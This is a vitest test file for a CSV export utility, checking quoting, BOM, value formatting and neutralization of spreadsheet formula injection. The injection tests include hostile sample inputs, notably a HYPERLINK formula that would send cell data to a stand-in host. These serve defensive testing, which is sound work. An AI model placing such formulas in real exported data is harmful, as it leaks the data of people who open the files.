import { beforeEach, describe, expect, it, vi } from "vitest";

import { downloadCsv, toCsv } from "./csv";

const shareOrDownloadBlob = vi.hoisted(() => vi.fn());

vi.mock("../share/share-or-download", () => ({ shareOrDownloadBlob }));

interface User {
    name: string;
    email: string;
    logins: number;
    active: boolean;
    plan: { label: string } | null;
}

const USERS: User[] = [
    {
        name: "Ana",
        email: "ana@example.com",
        logins: 3,
        active: true,
        plan: { label: "Pro" },
    },
    {
        name: "Bruno",
        email: "bruno@example.com",
        logins: 0,
        active: false,
        plan: null,
    },
];

const COLUMNS = [
    { key: "name", header: "Nome" },
    { key: "email", header: "E-mail" },
] as const;

const withoutBom = (csv: string): string => csv.replace(/^\uFEFF/, "");
const lines = (csv: string): string[] => withoutBom(csv).split("\r\n");

describe("toCsv", () => {
    it("writes the header and one line per row", () => {
        expect(lines(toCsv(USERS, [...COLUMNS]))).toEqual([
            "Nome,E-mail",
            "Ana,ana@example.com",
            "Bruno,bruno@example.com",
        ]);
    });

    it("terminates rows with CRLF, as the RFC asks", () => {
        expect(withoutBom(toCsv(USERS, [...COLUMNS]))).toContain("\r\n");
    });

    it("writes the header alone for an empty list", () => {
        expect(lines(toCsv([], [...COLUMNS]))).toEqual(["Nome,E-mail"]);
    });

    it("prefixes a BOM by default, so Excel pt-BR reads UTF-8", () => {
        expect(toCsv(USERS, [...COLUMNS]).startsWith("\uFEFF")).toBe(true);
    });

    it("omits the BOM on request", () => {
        expect(toCsv(USERS, [...COLUMNS], { bom: false }).startsWith("\uFEFF")).toBe(false);
    });
});

describe("toCsv — escaping", () => {
    const quote = (value: string): string =>
        lines(toCsv([{ v: value }], [{ key: "v", header: "V" }]))[1] ?? "";

    it("quotes a field holding the delimiter", () => {
        expect(quote("Silva, Ana")).toBe('"Silva, Ana"');
    });

    it("doubles a quote inside the field", () => {
        expect(quote('Ana "Aninha"')).toBe('"Ana ""Aninha"""');
    });

    it("quotes a field holding a line break", () => {
        expect(quote("linha 1\nlinha 2")).toBe('"linha 1\nlinha 2"');
    });

    it("quotes a field holding a carriage return", () => {
        expect(quote("a\rb")).toBe('"a\rb"');
    });

    it("handles delimiter, quote and break at once", () => {
        expect(quote('a,b"c\nd')).toBe('"a,b""c\nd"');
    });

    it("leaves an ordinary field unquoted", () => {
        expect(quote("Ana")).toBe("Ana");
    });

    it("quotes a header that needs it", () => {
        expect(lines(toCsv([], [{ key: "v", header: "Total, R$" }]))[0]).toBe('"Total, R$"');
    });

    /**
     * This used to assert that `"a,b"` stays bare in a `;` file. Reversed on
     * purpose (#481): a spreadsheet whose list separator is the other one may split
     * the bare field there, so text holding `,`, `;` or TAB is quoted whatever the
     * delimiter. `neutralizeFormulas: false` keeps the old, delimiter-only quoting.
     */
    it("quotes text holding either list separator or a TAB, whatever the delimiter", () => {
        const csv = toCsv(
            [{ v: "a;b" }, { v: "a,b" }, { v: "a\tb" }],
            [{ key: "v", header: "V" }],
            { delimiter: ";" },
        );
        expect(lines(csv)).toEqual(["V", '"a;b"', '"a,b"', '"a\tb"']);
        expect(quote("a;b")).toBe('"a;b"');
        const verbatim = toCsv([{ v: "a,b" }], [{ key: "v", header: "V" }], {
            delimiter: ";",
            neutralizeFormulas: false,
        });
        expect(lines(verbatim)[1]).toBe("a,b");
    });
});

describe("toCsv — values", () => {
    const cell = (row: Partial<User>): string =>
        lines(
            toCsv([row as User], [{ key: "logins", header: "L" }] as {
                key: keyof User;
                header: string;
            }[]),
        )[1] ?? "";

    it("writes zero rather than treating it as empty", () => {
        expect(cell({ logins: 0 })).toBe("0");
    });

    it("writes false rather than treating it as empty", () => {
        const csv = toCsv(USERS, [{ key: "active", header: "Ativo" }]);
        expect(lines(csv)).toEqual(["Ativo", "true", "false"]);
    });

    it("writes an empty field for null and undefined, not the word", () => {
        const csv = toCsv([{ a: null, b: undefined }], [
            { key: "a", header: "A" },
            { key: "b", header: "B" },
        ] as { key: "a" | "b"; header: string }[]);
        expect(lines(csv)[1]).toBe(",");
    });

    it("writes a Date as ISO instead of a locale-dependent string", () => {
        const csv = toCsv([{ at: new Date("2026-03-05T13:00:00.000Z") }], [
            { key: "at", header: "At" },
        ] as { key: "at"; header: string }[]);
        expect(lines(csv)[1]).toBe("2026-03-05T13:00:00.000Z");
    });

    it("uses the csv accessor for a column the table renders as a node", () => {
        const csv = toCsv(USERS, [
            { key: "plan", header: "Plano", csv: (user) => user.plan?.label ?? "" },
        ]);
        expect(lines(csv)).toEqual(["Plano", "Pro", ""]);
    });

    it("writes an empty field for a key the row does not have", () => {
        const rows: { missing?: string }[] = [{}];
        const csv = toCsv(rows, [{ key: "missing", header: "M" }]);
        expect(lines(csv)[1]).toBe("");
    });
});

describe("toCsv — formula injection (#446)", () => {
    const column = [{ key: "v", header: "V" }] as { key: "v"; header: string }[];
    const cell = (value: unknown, options: Parameters<typeof toCsv>[2] = {}): string =>
        lines(toCsv([{ v: value }], column, options))[1] ?? "";

    it.each([
        ["=1+2", "'=1+2"],
        ["+3+4", "'+3+4"],
        ["-5+1", "'-5+1"],
        ["@SUM(1+1)", "'@SUM(1+1)"],
        ["-- nota", "'-- nota"],
    ])("prefixes a quote to the string %j so a spreadsheet reads it as text", (raw, written) => {
        expect(cell(raw)).toBe(written);
    });

    /**
     * This used to assert `'\t=1+1`, bare. Rewritten on purpose (#481): TAB is a
     * list separator a spreadsheet may split on, so the field is quoted and the
     * `=1+1` after the TAB gets its own `'` — split there, the second cell would
     * otherwise start with `=`.
     */
    it("prefixes a leading TAB and the formula after it, and quotes the field", () => {
        expect(cell("\t=1+1")).toBe("\"'\t'=1+1\"");
    });

    it("neutralizes and still quotes a formula that carries the delimiter and quotes", () => {
        expect(cell('=HYPERLINK("http://x/?d="&A1,"x")')).toBe(
            '"\'=HYPERLINK(""http://x/?d=""&A1,""x"")"',
        );
    });

    it("neutralizes a field that starts with a carriage return", () => {
        expect(cell("\r=1+1")).toBe('"\'\r=1+1"');
    });

    it("leaves a real negative number alone, typed or written as text", () => {
        expect(cell(-5)).toBe("-5");
        expect(cell(-1.5)).toBe("-1.5");
        expect(cell(-2e-7)).toBe("-2e-7");
        expect(cell("-5")).toBe("-5");
        expect(cell("-1.234,56", { delimiter: ";" })).toBe("-1.234,56");
        expect(cell("+42")).toBe("+42");
    });

    /**
     * This used to assert `"'-"`. Reversed on purpose: a lone `-` has no operand,
     * so no spreadsheet can evaluate it, LibreOffice 26.2 read it as text without
     * the prefix, and it is the common "no value" placeholder — the prefix only
     * printed a stray `'` in every empty cell of a report.
     */
    it("leaves a lone dash alone, since an operator without operand is not a formula", () => {
        expect(cell("-")).toBe("-");
        expect(cell("--")).toBe("'--");
        expect(cell("- 1")).toBe("'- 1");
    });

    it.each([
        ["+55 (11) 99999-9999", "'+55 (11) 99999-9999"],
        ["@maria", "'@maria"],
    ])("still prefixes %j, which Excel and Sheets read as a formula start", (raw, written) => {
        expect(cell(raw)).toBe(written);
    });

    it.each([" =1+1", "\n=1+1"])(
        "leaves %j alone: whitespace before = read as text in LibreOffice 26.2",
        (raw) => {
            expect(cell(raw, { delimiter: ";" })).toBe(raw.startsWith("\n") ? `"${raw}"` : raw);
        },
    );

    it("leaves an ordinary field and a formula character in the middle alone", () => {
        expect(cell("a=b")).toBe("a=b");
        expect(cell("ana@example.com")).toBe("ana@example.com");
    });

    it.each([",", ";"] as const)(
        "neutralizes a formula that would start a cell after a , ; or TAB in a %j file (#481)",
        (delimiter) => {
            const written = (raw: string): string => cell(raw, { delimiter });
            expect(written("x;=HYPERLINK(CHAR(104)&A1)")).toBe('"x;\'=HYPERLINK(CHAR(104)&A1)"');
            expect(written("a,=1+2")).toBe('"a,\'=1+2"');
            expect(written("x\t=1+2")).toBe('"x\t\'=1+2"');
            expect(written("x;+1+2")).toBe('"x;\'+1+2"');
            expect(written("x;@SUM(1)")).toBe('"x;\'@SUM(1)"');
            expect(written("=1;=2")).toBe("\"'=1;'=2\"");
            for (const segment of written("a;=1,b\t@c;-d")
                .slice(1, -1)
                .split(/[,;\t]/)) {
                expect(segment).not.toMatch(/^[=+\-@\t\r]/);
            }
        },
    );

    it("leaves a plain number and a lone dash alone after a separator, and does not quote a plain number for the other separator", () => {
        expect(cell("-1.234,56", { delimiter: ";" })).toBe("-1.234,56");
        expect(cell("1,5")).toBe('"1,5"');
        expect(cell("a;-5")).toBe('"a;-5"');
        expect(cell("a;-")).toBe('"a;-"');
        expect(cell("a; =1")).toBe('"a; =1"');
        expect(cell(-5, { delimiter: ";" })).toBe("-5");
    });

    it("neutralizes a header too, since column names can come from data", () => {
        expect(lines(toCsv([], [{ key: "v", header: "=1+2" }]))[0]).toBe("'=1+2");
    });

    it("writes the field verbatim when neutralizeFormulas is false", () => {
        expect(cell("=1+2", { neutralizeFormulas: false })).toBe("=1+2");
        expect(cell("x;=1+2", { neutralizeFormulas: false })).toBe("x;=1+2");
        expect(cell("@x", { neutralizeFormulas: false })).toBe("@x");
    });
});

describe("downloadCsv", () => {
    beforeEach(() => {
        shareOrDownloadBlob.mockReset();
    });

    it("hands a text/csv blob to the share-or-download path", async () => {
        await downloadCsv(USERS, [...COLUMNS], "usuarios.csv");

        expect(shareOrDownloadBlob).toHaveBeenCalledTimes(1);
        const [blob, fileName] = shareOrDownloadBlob.mock.calls[0] as [Blob, string];
        expect(blob.type).toBe("text/csv;charset=utf-8");
        expect(fileName).toBe("usuarios.csv");
        expect(withoutBom(await blob.text())).toContain("Ana,ana@example.com");
    });

    it("falls back to export.csv when no name is given", async () => {
        await downloadCsv(USERS, [...COLUMNS]);
        expect(shareOrDownloadBlob.mock.calls[0]?.[1]).toBe("export.csv");
    });

    it("forwards the delimiter and BOM options", async () => {
        await downloadCsv(USERS, [...COLUMNS], "u.csv", { delimiter: ";", bom: false });
        const [blob] = shareOrDownloadBlob.mock.calls[0] as [Blob];
        const text = await blob.text();
        expect(text.startsWith("\uFEFF")).toBe(false);
        expect(text).toContain("Nome;E-mail");
    });

    it("neutralizes formulas by default and forwards the opt-out", async () => {
        const rows = [{ v: "=1+2" }];
        const column = [{ key: "v", header: "V" }] as { key: "v"; header: string }[];
        await downloadCsv(rows, column);
        await downloadCsv(rows, column, "raw.csv", { neutralizeFormulas: false });
        const [safe, raw] = await Promise.all(
            shareOrDownloadBlob.mock.calls.map(([blob]) => (blob as Blob).text()),
        );
        expect(lines(safe ?? "")[1]).toBe("'=1+2");
        expect(lines(raw ?? "")[1]).toBe("=1+2");
    });
});
